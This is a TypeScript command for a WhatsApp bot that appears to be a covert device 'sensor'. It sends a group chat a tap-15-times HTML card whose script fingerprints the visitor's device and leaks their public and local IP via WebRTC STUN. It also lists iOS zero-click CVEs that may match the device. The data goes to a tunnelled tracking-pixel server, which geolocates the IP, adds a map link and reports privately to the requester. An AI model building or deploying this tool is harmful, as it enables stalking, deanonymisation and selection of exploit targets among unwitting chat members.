import { randomUUID } from "node:crypto";
import { spawn, execFileSync } from "node:child_process";
import { createServer, type Server } from "node:http";
import { promises as fs, existsSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const G = globalThis as any;
const S: Map<string, any> = (G.__tx3 ??= new Map());
const sockRef: { cur: any } = (G.__tx3Sock ??= { cur: null });
const started: { v: boolean } = (G.__tx3Start ??= { v: false });

const PORT = Number(process.env.TX3_PORT || 8791);
const TTL = 3 * 60 * 60 * 1000;
const GIF = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

/* ───────────────────────── túnel ───────────────────────── */

function binDir() {
  for (const d of [path.join(process.cwd(), ".tx3"), path.join(tmpdir(), "tx3")]) {
    try { mkdirSync(d, { recursive: true }); return d; } catch {}
  }
  return path.join(tmpdir(), "tx3");
}
const BD = binDir();
const BIN = path.join(BD, process.platform === "win32" ? "cloudflared.exe" : "cloudflared");

function asset(): string | null {
  const a = process.arch;
  if (process.platform === "linux") return a === "x64" ? "cloudflared-linux-amd64" : a === "arm64" ? "cloudflared-linux-arm64" : a === "arm" ? "cloudflared-linux-arm" : null;
  if (process.platform === "win32") return a === "ia32" ? "cloudflared-windows-386.exe" : "cloudflared-windows-amd64.exe";
  if (process.platform === "darwin") return a === "arm64" ? "cloudflared-darwin-arm64.tgz" : "cloudflared-darwin-amd64.tgz";
  return null;
}

async function ensureBin(): Promise<string | null> {
  if (existsSync(BIN)) return BIN;
  const n = asset();
  if (!n) return null;
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), 15000);
  try {
    const r = await fetch(`https://github.com/cloudflare/cloudflared/releases/latest/download/${n}`, { redirect: "follow", signal: c.signal });
    if (!r.ok) return null;
    const b = Buffer.from(await r.arrayBuffer());
    if (b.length < 100_000) return null;
    if (n.endsWith(".tgz")) {
      const tmp = path.join(BD, "cf.tgz");
      await fs.writeFile(tmp, b);
      execFileSync("tar", ["-xzf", tmp, "-C", BD], { stdio: "ignore" });
      await fs.unlink(tmp).catch(() => undefined);
    } else await fs.writeFile(BIN, b);
    await fs.chmod(BIN, 0o755).catch(() => undefined);
    return BIN;
  } catch { return null; } finally { clearTimeout(t); }
}

const tun = (G.__tx3Tun ??= { url: "", proc: null as any, tries: 0, err: "" });
const SSH = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ExitOnForwardFailure=yes", "-o", "ConnectTimeout=10"];

function has(c: string) {
  for (const [b, a] of [["which", [c]], ["sh", ["-c", `command -v ${c}`]]] as const) {
    try { execFileSync(b, a as string[], { stdio: "ignore" }); return true; } catch {}
  }
  return false;
}

function prov(name: string, bin: string | null) {
  const npx = process.platform === "win32" ? "npx.cmd" : "npx";
  if (name === "cf") return bin ? { cmd: bin, args: ["tunnel", "--url", `http://127.0.0.1:${PORT}`, "--no-autoupdate"], re: /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i } : null;
  if (name === "lhr") return has("ssh") ? { cmd: "ssh", args: [...SSH, "-R", `80:localhost:${PORT}`, "nokey@localhost.run"], re: /https:\/\/[a-z0-9-]+\.lhr\.life/i } : null;
  if (name === "serveo") return has("ssh") ? { cmd: "ssh", args: [...SSH, "-R", `80:localhost:${PORT}`, "serveo.net"], re: /https:\/\/[a-z0-9-]+\.serveo\.net/i } : null;
  if (name === "lt") return has(npx) ? { cmd: npx, args: ["--yes", "localtunnel", "--port", String(PORT)], re: /https:\/\/[a-z0-9-]+\.loca\.lt/i } : null;
  return null;
}
const ORDER = ["cf", "lhr", "serveo", "lt"];

function base() {
  return (process.env.TX3_BASE_URL || "").replace(/\/+$/, "") || tun.url || (G.__locTunnel?.url || "");
}

function kill() { try { tun.proc?.kill("SIGKILL"); } catch {} tun.proc = null; tun.url = ""; }

async function alive(u: string) {
  try {
    const c = new AbortController();
    const t = setTimeout(() => c.abort(), 4000);
    const r = await fetch(`${u}/__hc`, { signal: c.signal });
    clearTimeout(t);
    return r.ok;
  } catch { return false; }
}

function open(bin: string | null): Promise<string> {
  const p = prov(ORDER[tun.tries % ORDER.length], bin);
  if (!p) { tun.tries++; return Promise.resolve(""); }
  return new Promise((res) => {
    let done = false;
    let ch: any;
    try { ch = spawn(p.cmd, p.args, { stdio: ["ignore", "pipe", "pipe"] }); } catch { tun.tries++; return res(""); }
    tun.proc = ch;
    const fin = (v: string) => { if (done) return; done = true; clearTimeout(tm); res(v); };
    const on = (b: Buffer) => {
      const m = b.toString().match(p.re);
      if (m && !tun.url) { tun.url = m[0].replace(/\/+$/, ""); tun.tries = 0; fin(tun.url); }
    };
    ch.stdout?.on("data", on); ch.stderr?.on("data", on);
    ch.on("exit", () => { if (tun.proc === ch) { tun.proc = null; tun.url = ""; } if (!done) { tun.tries++; fin(""); } });
    ch.on("error", () => { tun.proc = null; tun.tries++; fin(""); });
    const tm = setTimeout(() => { if (!tun.url) { try { ch.kill("SIGKILL"); } catch {} tun.proc = null; tun.tries++; fin(""); } }, 16000);
  });
}

async function ensureBase() {
  const cur = base();
  if (cur && (await alive(cur))) return cur;
  kill();
  const bin = await ensureBin();
  for (let i = 0; i < 5; i++) {
    const u = await open(bin);
    if (!u) { await sleep(600); continue; }
    for (let k = 0; k < 6; k++) { if (await alive(u)) return u; await sleep(1500); }
    kill();
  }
  return "";
}

/* ───────────────────────── geo + aviso ───────────────────────── */

function ipOf(req: any) {
  const h = req.headers || {};
  const raw = h["cf-connecting-ip"] || h["x-real-ip"] || String(h["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "";
  const ip = String(raw).replace(/^::ffff:/, "").trim();
  return ip === "::1" || ip === "127.0.0.1" ? "" : ip;
}

async function geo(ip: string) {
  if (!ip) return null;
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { headers: { "User-Agent": "tx3" } });
    if (!r.ok) return null;
    const j: any = await r.json();
    if (!j || j.error) return null;
    return { city: j.city, region: j.region, country: j.country_name, org: j.org, lat: j.latitude, lon: j.longitude };
  } catch { return null; }
}

function out(res: any, code: number, type: string, body: any) {
  res.writeHead(code, { "Content-Type": type, "Cache-Control": "no-store", "Access-Control-Allow-Origin": "*" });
  res.end(body);
}

async function handle(req: any, res: any) {
  const u = new URL(req.url || "/", `http://${req.headers.host || "x"}`);
  const p = u.pathname;

  if (p === "/__hc") return out(res, 200, "text/plain", "ok");

  const m = p.match(/^\/t\/([A-Za-z0-9_-]{6,48})\.gif$/);
  if (!m) return out(res, 404, "text/plain", "");

  out(res, 200, "image/gif", GIF);

  const s = S.get(m[1]);
  if (!s) return;

  let d: any = {};
  try { d = JSON.parse(u.searchParams.get("d") || "{}"); } catch {}

  const ip = d.pub || ipOf(req);
  const g = await geo(ip);

  const lines = [
    `🕷️ *Dispositivo identificado*`,
    ``,
    `IP: \`${ip || "?"}\``,
    d.loc ? `IP local: \`${d.loc}\`` : "",
    g ? `Lugar: *${[g.city, g.region, g.country].filter(Boolean).join(", ")}*` : "",
    g?.org ? `Red: ${g.org}` : "",
    g?.lat ? `https://maps.google.com/?q=${g.lat},${g.lon}` : "",
    ``,
    `SO: ${d.os || "?"} ${d.ver || ""}`.trim(),
    d.model ? `Modelo: ${d.model}` : "",
    `Navegador: ${d.ua || "?"}`,
    d.cores ? `Núcleos: ${d.cores} · RAM: ${d.mem || "?"} GB` : "",
    d.screen ? `Pantalla: ${d.screen}` : "",
    d.tz ? `Zona: ${d.tz}` : "",
    d.lang ? `Idioma: ${d.lang}` : "",
    d.gpu ? `GPU: ${d.gpu}` : "",
    d.canvas ? `Canvas: ${d.canvas}` : "",
    d.fonts ? `Fuentes: ${d.fonts}` : "",
    d.conn ? `Conexión: ${d.conn}` : "",
    d.bat ? `Batería: ${d.bat}` : "",
    d.storage ? `Disco: ${d.storage}` : "",
    ``,
    d.vulns ? `☠️ *Posibles*:\n${d.vulns}` : "☠️ Sin CVEs obvios por versión",
    `Hora: ${new Date().toLocaleString("es-MX")}`,
  ].filter(Boolean);

  await sockRef.cur?.sendMessage(s.requester, { text: lines.join("\n"), mentions: [s.requester] }, { quoted: s.cmdMsg }).catch(() => undefined);
}

function startServer() {
  if (started.v) return;
  started.v = true;
  const srv: Server = createServer((rq, rs) => handle(rq, rs).catch(() => { try { out(rs, 500, "text/plain", ""); } catch {} }));
  srv.on("error", (e: any) => { if (e?.code === "EADDRINUSE") console.log(`[tx3] puerto ${PORT} ocupado`); });
  srv.listen(PORT, () => console.log(`[tx3] :${PORT}`));
  setInterval(() => { const n = Date.now(); for (const [k, v] of S) if (n - v.at > TTL) S.delete(k); }, 10 * 60 * 1000).unref?.();
  process.once("exit", kill);
}

/* ───────────────────────── tarjeta ───────────────────────── */

function card(sid: string, b: string, name: string) {
  const host = (() => { try { return new URL(b).host; } catch { return b; } })();
  const B = `${b}/t/${sid}.gif`;

  const taps = Array.from({ length: 15 }, (_, i) => `<div class="tp" data-i="${i}">▸ toca aquí (${i + 1}/15)</div>`).join("");

  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;background:#04070d;color:#9ef0d0;padding:10px}
.c{max-width:420px;margin:0 auto;border:1px solid #10b981;border-radius:12px;overflow:hidden;background:#060b12}
.h{padding:8px 11px;border-bottom:1px solid #10392c;font-size:11px;letter-spacing:2px;color:#34d399;background:#04120d}
.b{padding:11px}
.n{font-size:11px;color:#7ea;opacity:.75;margin-bottom:8px}
.tp{font-size:11.5px;padding:5px 7px;border:1px solid #123a2c;border-radius:6px;margin-bottom:3px;cursor:pointer;transition:.08s}
.tp:active{background:#0b2a20}
.tp.done{opacity:.28;text-decoration:line-through}
.pb{height:5px;background:#0a1f18;border-radius:3px;overflow:hidden;margin:8px 0}
.pf{height:100%;width:0;background:#10b981;transition:width .1s}
#o{font-size:10.5px;line-height:1.55;white-space:pre-wrap;word-break:break-all}
.k{color:#facc15}
.r{color:#f87171}
.g{color:#34d399}
</style>
<div class="c">
<div class="h">◤ TEST XD3 · SENSOR ◢</div>
<div class="b">
<div class="n">Hola <b>@__NAME__</b>. Toca las 15 líneas.</div>
<div class="pb"><div class="pf" id="pf"></div></div>
<div id="taps">${taps}</div>
<div id="o"></div>
</div></div>
<script>
var SID="__SID__",BASE="__BASE__",n=0,run=false;
function $(i){return document.getElementById(i)}
function esc(s){return String(s==null?"":s).replace(/[<>&]/g,function(c){return {"<":"&lt;",">":"&gt;","&":"&amp;"}[c]})}
function add(k,v){$('o').innerHTML+='<span class="k">'+k+'</span>: '+esc(v)+'\\n'}
function bad(t){$('o').innerHTML+='<span class="r">'+esc(t)+'</span>\\n'}
function good(t){$('o').innerHTML+='<span class="g">'+esc(t)+'</span>\\n'}

document.querySelectorAll('.tp').forEach(function(el){
  el.addEventListener('click',function(){
    if(el.classList.contains('done')||run)return;
    el.classList.add('done');n++;
    $('pf').style.width=(n/15*100)+'%';
    if(n>=15){run=true;go()}
  })
})

/* 1 · WebRTC STUN: IP pública sin permisos, por UDP (no la frena la CSP) */
function stun(){
  return new Promise(function(res){
    var o={pub:'',loc:''};
    try{
      var pc=new RTCPeerConnection({iceServers:[
        {urls:'stun:stun.l.google.com:19302'},
        {urls:'stun:stun1.l.google.com:19302'},
        {urls:'stun:stun.cloudflare.com:3478'}
      ]});
      pc.onicecandidate=function(e){
        if(!e.candidate){try{pc.close()}catch(x){};return res(o)}
        var c=e.candidate.candidate||'';
        var m=c.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/i);
        if(!m)return;
        var ip=m[1];
        if(/^(10\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[01])\\.|169\\.254\\.|fe80|::1)/i.test(ip))o.loc=o.loc||ip;
        else o.pub=o.pub||ip;
      };
      pc.createDataChannel('x');
      pc.createOffer().then(function(d){return pc.setLocalDescription(d)}).catch(function(){res(o)});
      setTimeout(function(){try{pc.close()}catch(x){};res(o)},5000);
    }catch(e){res(o)}
  })
}

function fpCanvas(){
  try{
    var c=document.createElement('canvas');c.width=260;c.height=60;
    var x=c.getContext('2d');
    x.textBaseline='top';x.font='15px Arial';x.fillStyle='#f60';x.fillRect(0,0,120,24);
    x.fillStyle='#069';x.fillText('XD3 fp \\u00e1\\u00e9\\u00ed',2,2);
    x.fillStyle='rgba(102,204,0,.7)';x.fillText('XD3 fp \\u00e1\\u00e9\\u00ed',4,20);
    var d=c.toDataURL().replace(/^data:image\\/png;base64,/,'');
    var h=5381;for(var i=0;i<d.length;i+=7){h=((h*33)^d.charCodeAt(i))>>>0}
    return h.toString(16)
  }catch(e){return '0'}
}

function fpGpu(){
  try{
    var c=document.createElement('canvas');
    var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
    if(!gl)return 'sin webgl';
    var dbg=gl.getExtension('WEBGL_debug_renderer_info');
    var v=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);
    return String(v).slice(0,70)
  }catch(e){return 'n/d'}
}

function osInfo(){
  var ua=navigator.userAgent||'';
  var o={os:'desconocido',ver:'',model:''};
  var ios=ua.match(/iPhone OS (\\d+)[._](\\d+)(?:[._](\\d+))?/);
  if(ios){o.os='iOS';o.ver=ios[1]+'.'+ios[2]+(ios[3]?'.'+ios[3]:'');o.model='iPhone'}
  else if(/iPad/.test(ua)){o.os='iPadOS';o.model='iPad'}
  else if(/Android (\\d+)(?:\\.(\\d+))?/.test(ua)){var a=ua.match(/Android (\\d+)(?:\\.(\\d+))?/);o.os='Android';o.ver=a[1]+(a[2]?'.'+a[2]:'');var mm=ua.match(/; ([^;)]+) Build/);if(mm)o.model=mm[1]}
  else if(/Windows NT 10/.test(ua))o.os='Windows 10/11';
  else if(/Mac OS X/.test(ua))o.os='macOS';
  else if(/Linux/.test(ua))o.os='Linux';
  return o
}

function cves(os,ver){
  var v=parseFloat(ver)||0,out=[];
  if(os==='iOS'||os==='iPadOS'){
    if(v>=15&&v<15.7)out.push('FORCEDENTRY CVE-2021-30860 (WebKit/PDF, 0-click)');
    if(v>=16&&v<16.6)out.push('BLASTPASS CVE-2023-41064 (ImageIO WebP, 0-click)');
    if(v>=16.6&&v<16.6.1)out.push('BLASTPASS CVE-2023-41061 (Wallet) — sin parchear');
    if(v>=16&&v<16.7)out.push('WebKit CVE-2023-41993 (JIT)');
    if(v>=17&&v<17.2)out.push('WebKit CVE-2023-42917');
    if(v<18)out.push('WebKit pre-18: superficie amplia de JIT');
    if(v>=18)out.push('iOS 18+: solo bugs de día cero');
  }
  if(os==='Android'){
    if(v<10)out.push('WebView viejo sin sandbox de renderer aislado');
    if(v<12)out.push('Parcel/WebView pre-12 con historial de RCE');
  }
  return out.length?out.join('\\n· '):''
}

function beacon(d){
  try{var i=new Image();i.src=BASE+'?d='+encodeURIComponent(JSON.stringify(d))+'&t='+Date.now()}catch(e){}
}

async function go(){
  bad('▸ arrancando sensores…')
  var o=osInfo();

  add('UA',navigator.userAgent)
  add('SO',o.os+' '+o.ver)
  if(o.model)add('Modelo',o.model)
  add('Plataforma',navigator.platform||'n/d')
  add('Idioma',navigator.language+' / '+(navigator.languages||[]).join(','))
  add('Núcleos',navigator.hardwareConcurrency||'n/d')
  add('RAM',navigator.deviceMemory||'n/d')
  add('Pantalla',screen.width+'x'+screen.height+' @'+(window.devicePixelRatio||1)+'x · color '+screen.colorDepth)
  try{add('Zona',Intl.DateTimeFormat().resolvedOptions().timeZone)}catch(e){}
  add('GPU',fpGpu())
  add('Canvas',fpCanvas())
  try{if(navigator.connection)add('Conexión',navigator.connection.effectiveType+' · '+(navigator.connection.downlink||'?')+'Mbps')}catch(e){}
  try{var b=await navigator.getBattery();add('Batería',Math.round(b.level*100)+'%'+(b.charging?' (cargando)':''))}catch(e){}
  try{var st=await navigator.storage.estimate();add('Disco',(st.usage/1048576).toFixed(1)+'MB usados de '+(st.quota/1048576).toFixed(0)+'MB')}catch(e){}
  try{
    var f=['Arial','Courier New','Georgia','Times New Roman','Verdana','Tahoma','Trebuchet MS','Impact','Comic Sans MS','Segoe UI','Roboto','Menlo','Helvetica Neue'];
    var ok=f.filter(function(x){return document.fonts.check('12px "'+x+'"')});
    add('Fuentes',ok.length+'/'+f.length)
  }catch(e){}
  try{if(navigator.userAgentData){var hi=await navigator.userAgentData.getHighEntropyValues(['model','platformVersion']);if(hi.model)add('Modelo HW',hi.model)}}catch(e){}

  var v=cves(o.os,o.ver);
  if(v)bad('☠️ Posibles CVEs:\\n· '+v);else good('☠️ Sin CVEs por versión')

  bad('▸ resolviendo red (STUN)…')
  var net=await stun()
  if(net.pub)good('IP pública: '+net.pub);else bad('IP pública: bloqueada')
  if(net.loc)add('IP local',net.loc)

  add('Tiempo',new Date().toLocaleString('es-MX'))

  beacon({pub:net.pub,loc:net.loc,os:o.os,ver:o.ver,model:o.model,ua:navigator.userAgent.slice(0,90),
    cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory,
    screen:screen.width+'x'+screen.height,tz:(function(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){return''}})(),
    lang:navigator.language,gpu:fpGpu(),canvas:fpCanvas(),vulns:v})

  good('\\n▸ enviado al operador')
  try{navigator.vibrate&&navigator.vibrate([40,30,40])}catch(e){}
}
</script>`;

  return {
    __typename: "GenAIUnifiedResponseSection",
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "GenAIaeacdsnwHtmlPrimitive",
        payload: html.replace(/__SID__/g, sid).replace(/__BASE__/g, b).replace(/__NAME__/g, name),
        url: b,
        trusted_sources: [host],
      },
    },
  };
}

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["testxd3", "xd3", "sensor"],
  category: "group",
  description: "Sensor de dispositivo: 15 toques y saca IP (STUN), huella, SO y CVEs; lo manda a tu privado.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;
    const requester: string = (msg.key as any).participant || from;

    await react("🕷️").catch(() => undefined);
    startServer();

    const b = await ensureBase();
    if (!b) {
      await react("❌").catch(() => undefined);
      await reply("Sin túnel para recibir datos.").catch(() => undefined);
      return;
    }

    const sid = randomUUID().replace(/-/g, "").slice(0, 24);
    S.set(sid, { requester, cmdMsg: msg, at: Date.now() });
    sockRef.cur = sock;

    const name = String((msg as any).pushName || "").trim() || "tú";

    try {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("🕷️ TEST XD3 // LuferOS")
        .setFooter("15 toques · reporte al privado");
      rich.addSection(card(sid, b, name));
      await rich.send(from, { quoted: msg });
      await react("✅").catch(() => undefined);
    } catch (e: any) {
      await react("❌").catch(() => undefined);
      await reply(`${fytBold("Error")}: ${e?.message || e}`).catch(() => undefined);
    }
  },
};
